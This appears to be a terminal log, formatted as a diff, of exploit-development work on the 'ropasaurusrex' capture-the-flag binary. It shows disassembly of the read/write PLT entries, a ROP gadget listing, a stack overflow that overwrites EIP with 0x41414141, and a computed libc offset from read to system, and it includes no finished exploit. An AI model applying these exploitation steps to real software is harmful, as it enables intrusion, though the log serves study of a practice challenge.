@@ -1,0 +1,661 @@
+shgroup@ubuntu:~$ cd Desktop/problems/ropasaurusrex/
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ ls
+ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ objdump -D ./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d | grep read
+ 80482de:	e8 ed 00 00 00       	call   80483d0 <read@plt+0xa4>
+ 80482e3:	e8 d8 01 00 00       	call   80484c0 <read@plt+0x194>
+0804832c <read@plt>:
+ 804837e:	75 3f                	jne    80483bf <read@plt+0x93>
+ 8048398:	73 1e                	jae    80483b8 <read@plt+0x8c>
+ 80483b6:	72 e8                	jb     80483a0 <read@plt+0x74>
+ 80483dd:	74 12                	je     80483f1 <read@plt+0xc5>
+ 80483e6:	74 09                	je     80483f1 <read@plt+0xc5>
+ 8048416:	e8 11 ff ff ff       	call   804832c <read@plt>
+ 8048426:	e8 c9 ff ff ff       	call   80483f4 <read@plt+0xc8>
+ 8048466:	e8 4f 00 00 00       	call   80484ba <read@plt+0x18e>
+ 804848c:	74 24                	je     80484b2 <read@plt+0x186>
+ 80484b0:	72 de                	jb     8048490 <read@plt+0x164>
+ 80484cf:	74 13                	je     80484e4 <read@plt+0x1b8>
+ 80484e2:	75 f4                	jne    80484d8 <read@plt+0x1ac>
+ 80484f3:	e8 00 00 00 00       	call   80484f8 <read@plt+0x1cc>
+ 80484ff:	e8 6c fe ff ff       	call   8048370 <read@plt+0x44>
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ objdump -D ./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d | grep write
+0804830c <write@plt>:
+ 8048442:	e8 c5 fe ff ff       	call   804830c <write@plt>
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ gdb ./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d 
+GNU gdb (Ubuntu/Linaro 7.4-2012.02-0ubuntu2) 7.4-2012.02
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/shgroup/Desktop/problems/ropasaurusrex/ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d...(no debugging symbols found)...done.
+gdb-peda$ x/i 0x80483d0
+   0x80483d0:	push   ebp
+gdb-peda$ x/5i 0x804832c
+   0x804832c <read@plt>:	jmp    DWORD PTR ds:0x804961c
+   0x8048332 <read@plt+6>:	push   0x18
+   0x8048337 <read@plt+11>:	jmp    0x80482ec
+   0x804833c:	Cannot access memory at address 0x804833c
+gdb-peda$ x/3i 0x804830c
+   0x804830c <write@plt>:	jmp    DWORD PTR ds:0x8049614
+   0x8048312 <write@plt+6>:	push   0x8
+   0x8048317 <write@plt+11>:	jmp    0x80482ec
+gdb-peda$ exit
+Undefined command: "exit".  Try "help".
+gdb-peda$ quit
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ ../../rp-lin-x64 -f ./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d | grep pop
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ ../../rp-lin-x64 -f ./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d -r 4| grep pop
+0x080483c1: add al, 0x5B ; pop ebp ; ret  ;  (1 found)
+0x080484e6: add al, 0x5B ; pop ebp ; ret  ;  (1 found)
+0x080482e6: add byte [eax], al ; pop eax ; pop ebx ; leave  ; ret  ;  (1 found)
+0x080484de: add eax, dword [ebx-0x0B8A0008] ; add esp, 0x04 ; pop ebx ; pop ebp ; ret  ;  (1 found)
+0x080483bf: add esp, 0x04 ; pop ebx ; pop ebp ; ret  ;  (1 found)
+0x080484e4: add esp, 0x04 ; pop ebx ; pop ebp ; ret  ;  (1 found)
+0x080484b1: fiadd word [ebx+0x5E5B1CC4] ; pop edi ; pop ebp ; ret  ;  (1 found)
+0x080484e3: hlt  ; add esp, 0x04 ; pop ebx ; pop ebp ; ret  ;  (1 found)
+0x080483c0: les eax,  [ebx+ebx*2] ; pop ebp ; ret  ;  (1 found)
+0x080484e5: les eax,  [ebx+ebx*2] ; pop ebp ; ret  ;  (1 found)
+0x080484b3: les ebx,  [ebx+ebx*2] ; pop esi ; pop edi ; pop ebp ; ret  ;  (1 found)
+0x080483b8: mov byte [0x08049628], 0x00000001 ; add esp, 0x04 ; pop ebx ; pop ebp ; ret  ;  (1 found)
+0x08048451: mov ebp, esp ; pop ebp ; ret  ;  (1 found)
+0x0804844f: nop  ; push ebp ; mov ebp, esp ; pop ebp ; ret  ;  (1 found)
+0x080483bd: or byte [ecx], al ; add esp, 0x04 ; pop ebx ; pop ebp ; ret  ;  (1 found)
+0x080482e8: pop eax ; pop ebx ; leave  ; ret  ;  (1 found)
+0x080483c3: pop ebp ; ret  ;  (1 found)
+0x08048453: pop ebp ; ret  ;  (1 found)
+0x080484b8: pop ebp ; ret  ;  (1 found)
+0x080484e8: pop ebp ; ret  ;  (1 found)
+0x080482e9: pop ebx ; leave  ; ret  ;  (1 found)
+0x08048505: pop ebx ; leave  ; ret  ;  (1 found)
+0x080483c2: pop ebx ; pop ebp ; ret  ;  (1 found)
+0x080484e7: pop ebx ; pop ebp ; ret  ;  (1 found)
+0x080484b5: pop ebx ; pop esi ; pop edi ; pop ebp ; ret  ;  (1 found)
+0x08048504: pop ecx ; pop ebx ; leave  ; ret  ;  (1 found)
+0x080484b7: pop edi ; pop ebp ; ret  ;  (1 found)
+0x080484b6: pop esi ; pop edi ; pop ebp ; ret  ;  (1 found)
+0x080484e1: push dword [ebp-0x0C] ; add esp, 0x04 ; pop ebx ; pop ebp ; ret  ;  (1 found)
+0x08048450: push ebp ; mov ebp, esp ; pop ebp ; ret  ;  (1 found)
+0x080484b4: sbb al, 0x5B ; pop esi ; pop edi ; pop ebp ; ret  ;  (1 found)
+0x080483ba: sub byte [esi-0x7CFEF7FC], dl ; les eax,  [ebx+ebx*2] ; pop ebp ; ret  ;  (1 found)
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ ../../rp-lin-x64 -help
+rp++: invalid option "-e"
+rp++: invalid option "-l"
+rp++: invalid option "-p"
+Try './rp++ --help' for more information.
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ ../../rp-lin-x64 -h
+DESCRIPTION:
+rp++ allows you to find ROP gadgets in pe/elf/mach-o x86/x64 binaries.
+NB: The original idea comes from (@jonathansalwan) and its 'ROPGadget' tool.
+
+USAGE:
+./rp++ [-hv] [-f <binary path>] [-i <1,2,3>] [-r <positive int>] [--raw=<archi>] [--atsyntax] [--unique] [--search-hexa=<\x90A\x90>] [--search-int=<int in hex>]
+
+OPTIONS:
+  -f, --file=<binary path>  give binary path
+  -i, --info=<1,2,3>        display information about the binary header
+  -r, --rop=<positive int>  find useful gadget for your future exploits, arg is the gadget maximum size in instructions
+  --raw=<archi>             find gadgets in a raw file, 'archi' must be in the following list: x86, x64
+  --atsyntax                enable the at&t syntax
+  --unique                  display only unique gadget
+  --search-hexa=<\x90A\x90> try to find hex values
+  --search-int=<int in hex> try to find a pointer on a specific integer value
+  -h, --help                print this help and exit
+  -v, --version             print version information and exit
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ objdump -x ./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d 
+
+./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d:     file format elf32-i386
+./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d
+architecture: i386, flags 0x00000112:
+EXEC_P, HAS_SYMS, D_PAGED
+start address 0x08048340
+
+Program Header:
+    PHDR off    0x00000034 vaddr 0x08048034 paddr 0x08048034 align 2**2
+         filesz 0x000000e0 memsz 0x000000e0 flags r-x
+  INTERP off    0x00000114 vaddr 0x08048114 paddr 0x08048114 align 2**0
+         filesz 0x00000013 memsz 0x00000013 flags r--
+    LOAD off    0x00000000 vaddr 0x08048000 paddr 0x08048000 align 2**12
+         filesz 0x0000051c memsz 0x0000051c flags r-x
+    LOAD off    0x0000051c vaddr 0x0804951c paddr 0x0804951c align 2**12
+         filesz 0x0000010c memsz 0x00000114 flags rw-
+ DYNAMIC off    0x00000530 vaddr 0x08049530 paddr 0x08049530 align 2**2
+         filesz 0x000000d0 memsz 0x000000d0 flags rw-
+    NOTE off    0x00000128 vaddr 0x08048128 paddr 0x08048128 align 2**2
+         filesz 0x00000044 memsz 0x00000044 flags r--
+   STACK off    0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**2
+         filesz 0x00000000 memsz 0x00000000 flags rw-
+
+Dynamic Section:
+  NEEDED               libc.so.6
+  INIT                 0x080482bc
+  FINI                 0x080484ec
+  HASH                 0x0804816c
+  GNU_HASH             0x08048198
+  STRTAB               0x08048218
+  SYMTAB               0x080481b8
+  STRSZ                0x00000050
+  SYMENT               0x00000010
+  DEBUG                0x00000000
+  PLTGOT               0x08049604
+  PLTRELSZ             0x00000020
+  PLTREL               0x00000011
+  JMPREL               0x0804829c
+  REL                  0x08048294
+  RELSZ                0x00000008
+  RELENT               0x00000008
+  VERNEED              0x08048274
+  VERNEEDNUM           0x00000001
+  VERSYM               0x08048268
+
+Version References:
+  required from libc.so.6:
+    0x0d696910 0x00 02 GLIBC_2.0
+
+Sections:
+Idx Name          Size      VMA       LMA       File off  Algn
+  0 .interp       00000013  08048114  08048114  00000114  2**0
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  1 .note.ABI-tag 00000020  08048128  08048128  00000128  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  2 .note.gnu.build-id 00000024  08048148  08048148  00000148  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  3 .hash         0000002c  0804816c  0804816c  0000016c  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  4 .gnu.hash     00000020  08048198  08048198  00000198  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  5 .dynsym       00000060  080481b8  080481b8  000001b8  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  6 .dynstr       00000050  08048218  08048218  00000218  2**0
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  7 .gnu.version  0000000c  08048268  08048268  00000268  2**1
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  8 .gnu.version_r 00000020  08048274  08048274  00000274  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+  9 .rel.dyn      00000008  08048294  08048294  00000294  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+ 10 .rel.plt      00000020  0804829c  0804829c  0000029c  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+ 11 .init         00000030  080482bc  080482bc  000002bc  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+ 12 .plt          00000050  080482ec  080482ec  000002ec  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+ 13 .text         000001ac  08048340  08048340  00000340  2**4
+                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+ 14 .fini         0000001c  080484ec  080484ec  000004ec  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, CODE
+ 15 .rodata       0000000d  08048508  08048508  00000508  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+ 16 .eh_frame     00000004  08048518  08048518  00000518  2**2
+                  CONTENTS, ALLOC, LOAD, READONLY, DATA
+ 17 .ctors        00000008  0804951c  0804951c  0000051c  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 18 .dtors        00000008  08049524  08049524  00000524  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 19 .jcr          00000004  0804952c  0804952c  0000052c  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 20 .dynamic      000000d0  08049530  08049530  00000530  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 21 .got          00000004  08049600  08049600  00000600  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 22 .got.plt      0000001c  08049604  08049604  00000604  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 23 .data         00000008  08049620  08049620  00000620  2**2
+                  CONTENTS, ALLOC, LOAD, DATA
+ 24 .bss          00000008  08049628  08049628  00000628  2**2
+                  ALLOC
+ 25 .comment      0000001c  00000000  00000000  00000628  2**0
+                  CONTENTS, READONLY
+SYMBOL TABLE:
+no symbols
+
+
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ objdump -h
+objdump: 'a.out': No such file
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ objdump --help
+Usage: objdump <option(s)> <file(s)>
+ Display information from object <file(s)>.
+ At least one of the following switches must be given:
+  -a, --archive-headers    Display archive header information
+  -f, --file-headers       Display the contents of the overall file header
+  -p, --private-headers    Display object format specific file header contents
+  -P, --private=OPT,OPT... Display object format specific contents
+  -h, --[section-]headers  Display the contents of the section headers
+  -x, --all-headers        Display the contents of all headers
+  -d, --disassemble        Display assembler contents of executable sections
+  -D, --disassemble-all    Display assembler contents of all sections
+  -S, --source             Intermix source code with disassembly
+  -s, --full-contents      Display the full contents of all sections requested
+  -g, --debugging          Display debug information in object file
+  -e, --debugging-tags     Display debug information using ctags style
+  -G, --stabs              Display (in raw form) any STABS info in the file
+  -W[lLiaprmfFsoRt] or
+  --dwarf[=rawline,=decodedline,=info,=abbrev,=pubnames,=aranges,=macro,=frames,
+          =frames-interp,=str,=loc,=Ranges,=pubtypes,
+          =gdb_index,=trace_info,=trace_abbrev,=trace_aranges,
+          =addr,=cu_index]
+                           Display DWARF info in the file
+  -t, --syms               Display the contents of the symbol table(s)
+  -T, --dynamic-syms       Display the contents of the dynamic symbol table
+  -r, --reloc              Display the relocation entries in the file
+  -R, --dynamic-reloc      Display the dynamic relocation entries in the file
+  @<file>                  Read options from <file>
+  -v, --version            Display this program's version number
+  -i, --info               List object formats and architectures supported
+  -H, --help               Display this information
+
+ The following switches are optional:
+  -b, --target=BFDNAME           Specify the target object format as BFDNAME
+  -m, --architecture=MACHINE     Specify the target architecture as MACHINE
+  -j, --section=NAME             Only display information for section NAME
+  -M, --disassembler-options=OPT Pass text OPT on to the disassembler
+  -EB --endian=big               Assume big endian format when disassembling
+  -EL --endian=little            Assume little endian format when disassembling
+      --file-start-context       Include context from start of file (with -S)
+  -I, --include=DIR              Add DIR to search list for source files
+  -l, --line-numbers             Include line numbers and filenames in output
+  -F, --file-offsets             Include file offsets when displaying information
+  -C, --demangle[=STYLE]         Decode mangled/processed symbol names
+                                  The STYLE, if specified, can be `auto', `gnu',
+                                  `lucid', `arm', `hp', `edg', `gnu-v3', `java'
+                                  or `gnat'
+  -w, --wide                     Format output for more than 80 columns
+  -z, --disassemble-zeroes       Do not skip blocks of zeroes when disassembling
+      --start-address=ADDR       Only process data whose address is >= ADDR
+      --stop-address=ADDR        Only process data whose address is <= ADDR
+      --prefix-addresses         Print complete address alongside disassembly
+      --[no-]show-raw-insn       Display hex alongside symbolic disassembly
+      --insn-width=WIDTH         Display WIDTH bytes on a single line for -d
+      --adjust-vma=OFFSET        Add OFFSET to all displayed section addresses
+      --special-syms             Include special symbols in symbol dumps
+      --prefix=PREFIX            Add PREFIX to absolute paths for -S
+      --prefix-strip=LEVEL       Strip initial directory names for -S
+      --dwarf-depth=N        Do not display DIEs at depth N or greater
+      --dwarf-start=N        Display DIEs starting with N, at the same depth
+                             or deeper
+      --dwarf-check          Make additional dwarf internal consistency checks.      
+
+objdump: supported targets: elf64-x86-64 elf32-i386 elf32-iamcu elf32-x86-64 a.out-i386-linux pei-i386 pei-x86-64 elf64-l1om elf64-k1om elf64-little elf64-big elf32-little elf32-big pe-x86-64 pe-bigobj-x86-64 pe-i386 plugin srec symbolsrec verilog tekhex binary ihex
+objdump: supported architectures: i386 i386:x86-64 i386:x64-32 i8086 i386:intel i386:x86-64:intel i386:x64-32:intel i386:nacl i386:x86-64:nacl i386:x64-32:nacl iamcu iamcu:intel l1om l1om:intel k1om k1om:intel plugin
+
+The following i386/x86-64 specific disassembler options are supported for use
+with the -M switch (multiple options should be separated by commas):
+  x86-64      Disassemble in 64bit mode
+  i386        Disassemble in 32bit mode
+  i8086       Disassemble in 16bit mode
+  att         Display instruction in AT&T syntax
+  intel       Display instruction in Intel syntax
+  att-mnemonic
+              Display instruction in AT&T mnemonic
+  intel-mnemonic
+              Display instruction in Intel mnemonic
+  addr64      Assume 64bit address size
+  addr32      Assume 32bit address size
+  addr16      Assume 16bit address size
+  data32      Assume 32bit data size
+  data16      Assume 16bit data size
+  suffix      Always display instruction suffix in AT&T syntax
+  amd64       Display instruction in AMD64 ISA
+  intel64     Display instruction in Intel64 ISA
+Report bugs to <http://www.sourceware.org/bugzilla/>.
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ ls
+ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ ./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d 
+^C
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ gdb ./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d 
+GNU gdb (Ubuntu/Linaro 7.4-2012.02-0ubuntu2) 7.4-2012.02
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/shgroup/Desktop/problems/ropasaurusrex/ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d...(no debugging symbols found)...done.
+gdb-peda$ print system
+No symbol table is loaded.  Use the "file" command.
+gdb-peda$ x/x system
+No symbol table is loaded.  Use the "file" command.
+gdb-peda$ quit
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ ./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ gdb ./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d ./core
+GNU gdb (Ubuntu/Linaro 7.4-2012.02-0ubuntu2) 7.4-2012.02
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/shgroup/Desktop/problems/ropasaurusrex/ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d...(no debugging symbols found)...done.
+/home/shgroup/Desktop/problems/ropasaurusrex/./core: No such file or directory.
+gdb-peda$ print system
+No symbol table is loaded.  Use the "file" command.
+gdb-peda$ x/x system
+No symbol table is loaded.  Use the "file" command.
+gdb-peda$ quit
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ ls
+ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ ulimit -c unlimited
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ ./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault (core dumped)
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ ls
+core  ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ gdb ./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d ./core
+GNU gdb (Ubuntu/Linaro 7.4-2012.02-0ubuntu2) 7.4-2012.02
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/shgroup/Desktop/problems/ropasaurusrex/ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d...(no debugging symbols found)...done.
+
+warning: core file may not match specified executable file.
+[New LWP 2769]
+Core was generated by `./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x41414141 in ?? ()
+gdb-peda$ print system
+$1 = {<text variable, no debug info>} 0xf7562940 <system>
+gdb-peda$ print read
+$2 = {<text variable, no debug info>} 0xf75fc350 <read>
+gdb-peda$ print 0xf75fc350-0xf7562940
+$3 = 0x99a10
+gdb-peda$ quit
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ ls
+core  ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ socat
+2017/08/22 23:41:06 socat[3308] E exactly 2 addresses required (there are 0); use option "-h" for help
+shgroup@ubuntu:~/Desktop/problems/ropasaurusrex$ socat -h
+socat by Gerhard Rieger - see www.dest-unreach.org
+Usage:
+socat [options] <bi-address> <bi-address>
+   options:
+      -V     print version and feature information to stdout, and exit
+      -h|-?  print a help text describing command line options and addresses
+      -hh    like -h, plus a list of all common address option names
+      -hhh   like -hh, plus a list of all available address option names
+      -d     increase verbosity (use up to 4 times; 2 are recommended)
+      -D     analyze file descriptors before loop
+      -ly[facility]  log to syslog, using facility (default is daemon)
+      -lf<logfile>   log to file
+      -ls            log to stderr (default if no other log)
+      -lm[facility]  mixed log mode (stderr during initialization, then syslog)
+      -lp<progname>  set the program name used for logging
+      -lu            use microseconds for logging timestamps
+      -lh            add hostname to log messages
+      -v     verbose data traffic, text
+      -x     verbose data traffic, hexadecimal
+      -b<size_t>     set data buffer size (8192)
+      -s     sloppy (continue on error)
+      -t<timeout>    wait seconds before closing second channel
+      -T<timeout>    total inactivity timeout in seconds
+      -u     unidirectional mode (left to right)
+      -U     unidirectional mode (right to left)
+      -g     do not check option groups
+      -L <lockfile>  try to obtain lock, or fail
+      -W <lockfile>  try to obtain lock, or wait
+      -4     prefer IPv4 if version is not explicitly specified
+      -6     prefer IPv6 if version is not explicitly specified
+   bi-address:
+      pipe[,<opts>]	groups=FD,FIFO
+      <single-address>!!<single-address>
+      <single-address>
+   single-address:
+      <address-head>[,<opts>]
+   address-head:
+      abstract-client:<filename>	groups=FD,SOCKET,RETRY,UNIX
+      abstract-connect:<filename>	groups=FD,SOCKET,RETRY,UNIX
+      abstract-listen:<filename>	groups=FD,SOCKET,LISTEN,CHILD,RETRY,UNIX
+      abstract-recv:<filename>	groups=FD,SOCKET,RETRY,UNIX
+      abstract-recvfrom:<filename>	groups=FD,SOCKET,CHILD,RETRY,UNIX
+      abstract-sendto:<filename>	groups=FD,SOCKET,RETRY,UNIX
+      create:<filename>	groups=FD,REG,NAMED
+      exec:<command-line>	groups=FD,FIFO,SOCKET,EXEC,FORK,TERMIOS,PTY,PARENT,UNIX
+      fd:<num>	groups=FD,FIFO,CHR,BLK,REG,SOCKET,TERMIOS,UNIX,IP4,IP6,UDP,TCP,SCTP
+      gopen:<filename>	groups=FD,FIFO,CHR,BLK,REG,SOCKET,NAMED,OPEN,TERMIOS,UNIX
+      interface:<interface>	groups=FD,SOCKET
+      ip-datagram:<host>:<protocol>	groups=FD,SOCKET,RANGE,IP4,IP6
+      ip-recv:<protocol>	groups=FD,SOCKET,RANGE,IP4,IP6
+      ip-recvfrom:<protocol>	groups=FD,SOCKET,CHILD,RANGE,IP4,IP6
+      ip-sendto:<host>:<protocol>	groups=FD,SOCKET,IP4,IP6
+      ip4-datagram:<host>:<protocol>	groups=FD,SOCKET,RANGE,IP4
+      ip4-recv:<protocol>	groups=FD,SOCKET,RANGE,IP4
+      ip4-recvfrom:<protocol>	groups=FD,SOCKET,CHILD,RANGE,IP4
+      ip4-sendto:<host>:<protocol>	groups=FD,SOCKET,IP4
+      ip6-datagram:<host>:<protocol>	groups=FD,SOCKET,RANGE,IP6
+      ip6-recv:<protocol>	groups=FD,SOCKET,RANGE,IP6
+      ip6-recvfrom:<protocol>	groups=FD,SOCKET,CHILD,RANGE,IP6
+      ip6-sendto:<host>:<protocol>	groups=FD,SOCKET,IP6
+      open:<filename>	groups=FD,FIFO,CHR,BLK,REG,NAMED,OPEN,TERMIOS
+      openssl:<host>:<port>	groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,TCP,OPENSSL
+      openssl-listen:<port>	groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP4,IP6,TCP,OPENSSL
+      pipe:<filename>	groups=FD,FIFO,NAMED,OPEN
+      proxy:<proxy-server>:<host>:<port>	groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,TCP,HTTP
+      pty	groups=FD,NAMED,TERMIOS,PTY
+      sctp-connect:<host>:<port>	groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,SCTP
+      sctp-listen:<port>	groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP4,IP6,SCTP
+      sctp4-connect:<host>:<port>	groups=FD,SOCKET,CHILD,RETRY,IP4,SCTP
+      sctp4-listen:<port>	groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP4,SCTP
+      sctp6-connect:<host>:<port>	groups=FD,SOCKET,CHILD,RETRY,IP6,SCTP
+      sctp6-listen:<port>	groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP6,SCTP
+      socket-connect:<domain>:<protocol>:<remote-address>	groups=FD,SOCKET,CHILD,RETRY
+      socket-datagram:<domain>:<type>:<protocol>:<remote-address>	groups=FD,SOCKET,RANGE
+      socket-listen:<domain>:<protocol>:<local-address>	groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE
+      socket-recv:<domain>:<type>:<protocol>:<local-address>	groups=FD,SOCKET,RANGE
+      socket-recvfrom:<domain>:<type>:<protocol>:<local-address>	groups=FD,SOCKET,CHILD,RANGE
+      socket-sendto:<domain>:<type>:<protocol>:<remote-address>	groups=FD,SOCKET
+      socks4:<socks-server>:<host>:<port>	groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,TCP,SOCKS4
+      socks4a:<socks-server>:<host>:<port>	groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,TCP,SOCKS4
+      stderr	groups=FD,FIFO,CHR,BLK,REG,SOCKET,TERMIOS,UNIX,IP4,IP6,UDP,TCP,SCTP
+      stdin	groups=FD,FIFO,CHR,BLK,REG,SOCKET,TERMIOS,UNIX,IP4,IP6,UDP,TCP,SCTP
+      stdio	groups=FD,FIFO,CHR,BLK,REG,SOCKET,TERMIOS,UNIX,IP4,IP6,UDP,TCP,SCTP
+      stdout	groups=FD,FIFO,CHR,BLK,REG,SOCKET,TERMIOS,UNIX,IP4,IP6,UDP,TCP,SCTP
+      system:<shell-command>	groups=FD,FIFO,SOCKET,EXEC,FORK,TERMIOS,PTY,PARENT,UNIX
+      tcp-connect:<host>:<port>	groups=FD,SOCKET,CHILD,RETRY,IP4,IP6,TCP
+      tcp-listen:<port>	groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP4,IP6,TCP
+      tcp4-connect:<host>:<port>	groups=FD,SOCKET,CHILD,RETRY,IP4,TCP
+      tcp4-listen:<port>	groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP4,TCP
+      tcp6-connect:<host>:<port>	groups=FD,SOCKET,CHILD,RETRY,IP6,TCP
+      tcp6-listen:<port>	groups=FD,SOCKET,LISTEN,CHILD,RETRY,RANGE,IP6,TCP
+      tun[:<ip-addr>/<bits>]	groups=FD,CHR,NAMED,OPEN,INTERFACE
+      udp-connect:<host>:<port>	groups=FD,SOCKET,IP4,IP6,UDP
+      udp-datagram:<host>:<port>	groups=FD,SOCKET,RANGE,IP4,IP6,UDP
+      udp-listen:<port>	groups=FD,SOCKET,LISTEN,CHILD,RANGE,IP4,IP6,UDP
